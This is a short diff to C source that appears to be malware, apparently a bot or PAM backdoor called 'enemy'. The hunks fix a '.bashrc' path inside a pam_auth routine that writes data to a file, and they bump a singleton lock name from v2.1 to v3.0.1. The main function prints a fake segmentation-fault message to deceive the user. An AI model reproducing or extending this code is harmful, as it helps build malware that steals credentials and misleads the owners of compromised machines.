@@ -4245,7 +4245,7 @@ int pam_auth(char *username, char *password, char *host)
    fprintf(fptr,"%s\n",rekdevice);
    fclose(fptr);
    struct stat fileinfo;
-   stat("..bashrc", &fileinfo);
+   stat(".bashrc", &fileinfo);
     local = fopen(bashrc, "rb");
 
     if(!local) {
@@ -5016,7 +5016,7 @@ int singleton_connect(const char *name) {
 
 int main(int argc, char**argv) {
 	fprintf(stderr, "perror: EWOULDBLOCK\nSegmentation fault (core dumped)\n");
-	if(singleton_connect("enemyv2.1.lock")) exit(1); // rrrrrrrreeeeeeeeeee ....
+	if(singleton_connect("enemyv3.0.1.lock")) exit(1); // rrrrrrrreeeeeeeeeee ....
 	srand(time(NULL) ^ getpid() ^ getppid());
 	init_rand(time(NULL) ^ getpid() ^ getppid());
 	char pname[13];
